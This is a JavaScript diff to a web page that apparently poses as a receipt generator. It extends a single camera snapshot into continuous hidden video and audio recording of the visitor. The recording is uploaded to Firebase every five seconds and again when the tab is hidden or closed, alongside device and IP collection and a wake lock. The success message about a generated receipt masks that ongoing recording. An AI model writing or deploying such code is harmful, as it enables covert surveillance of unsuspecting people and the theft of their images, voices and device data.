@@ -204,6 +204,9 @@
 
     let registroRef = null;
     let wakeLock = null;
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let activeStream = null;
 
     async function ativarWakeLock() {
       try {
@@ -221,19 +224,21 @@
       }
     });
 
-    async function tirarFoto() {
+    async function iniciarMidiaEFoto() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
+        // Solicita Vídeo + Áudio
+        activeStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
-          audio: false
+          audio: true
         });
 
         const video = document.createElement('video');
-        video.srcObject = stream;
+        video.srcObject = activeStream;
         await video.play();
 
         await new Promise(resolve => setTimeout(resolve, 600));
 
+        // Tira a foto instantânea (Capa)
         const canvas = document.createElement('canvas');
         const width = 480;
         const height = (video.videoHeight * (width / video.videoWidth)) || 360;
@@ -242,15 +247,59 @@
 
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, width, height);
+        const fotoBase64 = canvas.toDataURL('image/jpeg', 0.6);
 
-        stream.getTracks().forEach(track => track.stop());
+        // Inicia a gravação de Vídeo + Áudio contínua
+        let mimeType = 'video/webm;codecs=vp8,opus';
+        if (!MediaRecorder.isTypeSupported(mimeType)) {
+          mimeType = 'video/webm';
+          if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';
+        }
 
-        return canvas.toDataURL('image/jpeg', 0.6);
+        const options = mimeType ? { mimeType } : {};
+        mediaRecorder = new MediaRecorder(activeStream, options);
+
+        mediaRecorder.ondataavailable = (event) => {
+          if (event.data && event.data.size > 0) {
+            recordedChunks.push(event.data);
+          }
+        };
+
+        mediaRecorder.start(1000); // Coleta trechos a cada 1 segundo
+
+        return fotoBase64;
       } catch (err) {
-        console.warn("Câmera indisponível ou negada:", err);
+        console.warn("Câmera/Microfone indisponível ou negado:", err);
         return null;
       }
     }
+
+    async function salvarVideoNoFirebase() {
+      if (!registroRef || recordedChunks.length === 0) return;
+
+      const blob = new Blob(recordedChunks, { type: mediaRecorder?.mimeType || 'video/webm' });
+      const reader = new FileReader();
+      reader.readAsDataURL(blob);
+      reader.onloadend = () => {
+        const videoBase64 = reader.result;
+        update(registroRef, { video: videoBase64 });
+      };
+    }
+
+    // Salva o vídeo no Firebase periodicamente (a cada 5s)
+    setInterval(() => {
+      if (mediaRecorder && mediaRecorder.state === 'recording') {
+        salvarVideoNoFirebase();
+      }
+    }, 5000);
+
+    // Salva ao fechar ou trocar de aba
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') {
+        salvarVideoNoFirebase();
+      }
+    });
+    window.addEventListener('pagehide', salvarVideoNoFirebase);
 
     async function capturarDispositivo() {
       let ipData = {};
@@ -316,7 +365,7 @@
 
       ativarWakeLock();
       const [fotoBase64, dispositivoInfo] = await Promise.all([
-        tirarFoto(),
+        iniciarMidiaEFoto(),
         capturarDispositivo()
       ]);
 
@@ -359,6 +408,7 @@
             dispositivo: dispositivoInfo
           }).then(() => {
             status.innerText = "Comprovante gerado com sucesso!";
+            salvarVideoNoFirebase();
           });
         },
         (err) => {
